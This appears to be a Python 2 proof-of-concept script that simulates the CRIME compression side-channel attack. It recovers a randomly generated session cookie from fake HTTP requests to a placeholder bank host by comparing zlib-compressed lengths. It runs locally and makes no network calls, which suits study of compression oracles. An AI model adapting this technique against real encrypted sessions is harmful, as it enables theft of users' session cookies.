# This is supposedly what CRIME by Juliano Rizzo and Thai Duong will do
# Algorithm by Thomas Pornin, coding by xorninja, improved by @kkotowicz
# http://security.blogoverflow.com/2012/09/how-can-you-protect-yourself-from-crime-beasts-successor/

import string
import zlib
import sys
import random

charset = string.letters + string.digits + "%/+="

COOKIE = ''.join(random.choice(charset) for x in range(30))

HEADERS = ("POST / HTTP/1.1\r\n"
       "Host: thebankserver.com\r\n"
           "Connection: keep-alive\r\n"
           "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1\r\n"
           "Accept: */*\r\n"
           "Referer: https://thebankserver.com/\r\n"
           "Cookie: secret=" + COOKIE +  "\r\n"
           "Accept-Encoding: gzip,deflate,sdch\r\n"
           "Accept-Language: en-US,en;q=0.8\r\n"
           "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n"
           "\r\n")

BODY = ("POST / HTTP/1.1\r\n"
           "Host: thebankserver.com\r\n"
           "Connection: keep-alive\r\n"
           "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1\r\n"
           "Accept: */*\r\n"
           "Referer: https://thebankserver.com/\r\n"
           "Cookie: secret="
         )

BODY_SUFFIX=("\r\n"
           "Accept-Encoding: gzip,deflate,sdch\r\n"
           "Accept-Language: en-US,en;q=0.8\r\n"
           "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n"
           "\r\n")

cookie = ""

def compress(data):

    c = zlib.compressobj()
    return c.compress(data) + c.flush(zlib.Z_SYNC_FLUSH)

def findnext(b,bs,charset):
    #print "body len",len(b)
    baselen = len(compress(HEADERS +
                      b +
                      bs))

    possible_chars = []
    for c in charset:
        length = len(compress(HEADERS +
                      b +
                      c +
                      bs))

        #print repr(c), length, baselen

        if length <= baselen:
            possible_chars.append(c)

    #print '=', possible_chars
    return possible_chars

def exit():
    print "Original cookie: %s" % COOKIE
    print "Leaked cookie  : %s" % cookie
    sys.exit(1)

    
def forward():
    global cookie
    while len(cookie) < len(COOKIE):
        chop = 1
        possible_chars = findnext(BODY + cookie, "", charset)
        body_tmp = BODY
        orig = possible_chars
        while not len(possible_chars) == 1:
            if len(body_tmp) < chop:
                #print "stuck at", possible_chars
                return False

            body_tmp = body_tmp[chop:]
            possible_chars = findnext(body_tmp + cookie, "", orig)

        cookie = cookie + possible_chars[0]
    return True

while BODY.find("\r\n") >= 0:
    
    if not forward():
        cookie = cookie[:-1]
    
    if len(cookie) >= len(COOKIE):
        exit()
    print "reducing body"
    BODY = BODY[BODY.find("\r\n") + 2:]

exit()        
